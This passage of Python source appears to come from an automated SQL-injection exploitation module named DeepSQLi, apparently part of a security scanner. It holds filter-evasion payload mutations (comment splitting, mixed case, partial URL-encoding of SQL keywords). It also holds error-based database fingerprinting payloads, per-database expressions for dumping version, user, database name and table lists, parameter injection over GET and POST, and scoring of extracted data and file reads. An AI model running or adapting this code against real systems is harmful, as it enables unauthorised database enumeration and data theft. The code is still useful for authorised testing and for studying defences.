        # 1) Comment injection: UN/**/ION SEL/**/ECT
        comment_variant = payload
        for kw in ("UNION", "SELECT", "FROM", "WHERE", "ORDER", "GROUP", "CONCAT", "SLEEP"):
            if kw in comment_variant.upper():
                idx = comment_variant.upper().find(kw)
                original_kw = comment_variant[idx:idx + len(kw)]
                mid = len(kw) // 2
                replaced = original_kw[:mid] + "/**/" + original_kw[mid:]
                comment_variant = comment_variant[:idx] + replaced + comment_variant[idx + len(kw):]
        if comment_variant != payload:
            variants.append(comment_variant)

        # 2) Case variation: uNiOn SeLeCt
        case_variant = payload
        for kw in ("UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "GROUP", "CONCAT"):
            mixed = ""
            for i, ch in enumerate(kw):
                mixed += ch.upper() if i % 2 == 0 else ch.lower()
            case_variant = re.sub(r'\b' + kw + r'\b', mixed, case_variant, flags=re.IGNORECASE)
        if case_variant != payload:
            variants.append(case_variant)

        # 3) URL-style encoding for key tokens
        encoded_variant = payload
        encoded_variant = encoded_variant.replace("UNION", "%55NION")
        encoded_variant = encoded_variant.replace("SELECT", "%53ELECT")
        encoded_variant = encoded_variant.replace("union", "%75nion")
        encoded_variant = encoded_variant.replace("select", "%73elect")
        if encoded_variant != payload:
            variants.append(encoded_variant)

        return variants

    # -----------------------------------------------------------------------
    # DB Fingerprinting
    # -----------------------------------------------------------------------
    async def _fingerprint_db(self, client, url, param, method, extra_fields) -> str | None:
        """Inject error-triggering payloads and match against DB error signatures."""
        error_payloads = [
            "1'",                           # Unclosed quote
            "1\"",                          # Unclosed double quote
            "1'--",                         # Comment after quote
            "1 AND 1=CONVERT(int,'a')",     # MSSQL-specific
            "1 AND 1=1::int",              # PostgreSQL cast
        ]

        for payload in error_payloads:
            if self._budget_exhausted():
                break
            resp = await self._send_safe(client, url, param, payload, method, extra_fields)
            if resp and resp.status_code in (200, 500, 503):
                body = resp.text
                for db_type, patterns in DB_FINGERPRINTS.items():
                    for pattern in patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            return db_type
        return None

    # -----------------------------------------------------------------------
    # DB-Specific Expression Helpers
    # -----------------------------------------------------------------------
    @staticmethod
    def _version_expr(db_type: str) -> str:
        return {
            "mysql": "@@version",
            "postgresql": "version()",
            "mssql": "@@version",
            "sqlite": "sqlite_version()",
            "oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
        }.get(db_type, "@@version")

    @staticmethod
    def _user_expr(db_type: str) -> str:
        return {
            "mysql": "current_user()",
            "postgresql": "current_user",
            "mssql": "SYSTEM_USER",
            "sqlite": "'sqlite'",
            "oracle": "user",
        }.get(db_type, "current_user()")

    @staticmethod
    def _db_expr(db_type: str) -> str:
        return {
            "mysql": "database()",
            "postgresql": "current_database()",
            "mssql": "DB_NAME()",
            "sqlite": "'main'",
            "oracle": "ora_database_name",
        }.get(db_type, "database()")

    @staticmethod
    def _tables_expr(db_type: str) -> str | None:
        return {
            "mysql": "GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
            "postgresql": "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
            "mssql": "STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_type='BASE TABLE'",
            "sqlite": "GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
            "oracle": "LISTAGG(table_name,',') WITHIN GROUP(ORDER BY table_name) FROM user_tables",
        }.get(db_type)

    # -----------------------------------------------------------------------
    # Network / Request Management
    # -----------------------------------------------------------------------
    async def _send_safe(self, client, url, param, payload, method, extra_fields) -> httpx.Response | None:
        """Rate-limited, budget-aware request sender."""
        if self._budget_exhausted():
            return None
        self._request_count += 1

        try:
            async with self.rate_limit:
                return await self._send(client, url, param, payload, method, extra_fields)
        except Exception as e:
            logger.debug(f"DeepSQLi request error: {e}")
            return None

    async def _send(self, client, url, param, payload, method, extra_fields) -> httpx.Response | None:
        """Send a request with the payload injected into the given parameter."""
        try:
            if method.upper() == "GET":
                injected = self._inject_param(url, param, payload)
                if extra_fields:
                    sep = "&" if "?" in injected else "?"
                    injected += sep + urlencode(extra_fields)
                return await client.get(injected, timeout=REQUEST_TIMEOUT)
            else:
                data = dict(extra_fields) if extra_fields else {}
                data[param] = payload
                return await client.post(url, data=data, timeout=REQUEST_TIMEOUT)
        except httpx.TimeoutException:
            # Timeouts are expected for time-based blind — return a mock
            # with empty text so caller can check elapsed time
            return None
        except Exception:
            return None

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        """Inject a value into a URL query parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_query = urlencode(flat)
        return urlunparse(parsed._replace(query=new_query))

    def _budget_exhausted(self) -> bool:
        """Check if we've hit the request budget."""
        if self._request_count >= MAX_REQUESTS:
            logger.warning(f"DeepSQLi: Request budget exhausted ({MAX_REQUESTS})")
            return True
        return False

    # -----------------------------------------------------------------------
    # Result Merging & Impact Assessment
    # -----------------------------------------------------------------------
    def _merge_union_result(self, result: dict, union: dict):
        """Merge UNION-based exploitation results into the main result dict."""
        result["injection_type"] = "union-based"
        result["db_version"] = union.get("version")
        result["version"] = union.get("version")
        result["current_user"] = union.get("current_user")
        result["current_db"] = union.get("current_db")
        result["tables_found"] = union.get("tables", [])
        result["tables"] = union.get("tables", [])
        result["columns_found"] = union.get("columns_found", {})
        result["sample_data"] = union.get("sample_data", {})
        result["extracted_data"] = union.get("extracted_data", {})
        result["column_count"] = union.get("column_count")
        result["injectable_column"] = union.get("injectable_column")
        result["file_read"] = union.get("file_read")
        result["evidence"].extend(union.get("evidence", []))
        result["techniques_used"].extend([
            f"union_column_count:{union.get('column_count')}",
            "union_version" if union.get("version") else None,
            f"union_tables:{len(union.get('tables', []))}" if union.get("tables") else None,
        ])
        result["techniques_used"] = [t for t in result["techniques_used"] if t]

    def _merge_error_result(self, result: dict, error: dict):
        """Merge error-based extraction results."""
        if error.get("version"):
            result["db_version"] = result["db_version"] or error["version"]
            result["version"] = result["version"] or error["version"]
        if error.get("current_user"):
            result["current_user"] = result["current_user"] or error["current_user"]
        if error.get("current_db"):
            result["current_db"] = result["current_db"] or error["current_db"]
        if error.get("tables"):
            result["tables_found"] = result["tables_found"] or error["tables"]
            result["tables"] = result["tables"] or error["tables"]
        result["evidence"].extend(error.get("evidence", []))
        result["techniques_used"].append("error_based_extract")

    def _merge_blind_result(self, result: dict, blind: dict):
        """Merge blind boolean extraction results."""
        if blind.get("version"):
            result["db_version"] = result["db_version"] or blind["version"]
            result["version"] = result["version"] or blind["version"]
        result["evidence"].extend(blind.get("evidence", []))
        result["techniques_used"].append("blind_boolean_extract")

    def _assess_impact(self, result: dict):
        """Assess severity and build impact description."""
        parts = []

        if result.get("extracted_data") or result.get("sample_data"):
            result["severity"] = "critical"
            tables_count = len(result.get("tables_found", []))
            cols_count = sum(len(v) for v in result.get("columns_found", {}).values())
            data_tables = list(result.get("sample_data", {}).keys())
            parts.append(f"Full database read access. Extracted {tables_count} tables, {cols_count} columns.")
            if data_tables:
                parts.append(f"Sample data extracted from: {', '.join(data_tables)}.")
        elif result.get("file_read"):
            result["severity"] = "critical"
            files = list(result["file_read"].keys())
            parts.append(f"File system read access via SQLi. Files read: {', '.join(files)}.")
        elif result.get("tables_found"):
            result["severity"] = "critical"
            parts.append(f"Database schema enumerated. {len(result['tables_found'])} tables discovered.")
        elif result.get("db_version"):
            result["severity"] = "high"
            parts.append(f"DB version disclosed: {result['db_version']}.")
        else:
            result["severity"] = "high"
            parts.append("SQL injection confirmed but limited extraction.")

        if result.get("current_user"):
            parts.append(f"DB user: {result['current_user']}.")
        if result.get("current_db"):
            parts.append(f"Database: {result['current_db']}.")
        if result.get("injection_type"):
            parts.append(f"Technique: {result['injection_type']}.")

        result["impact"] = " ".join(parts)
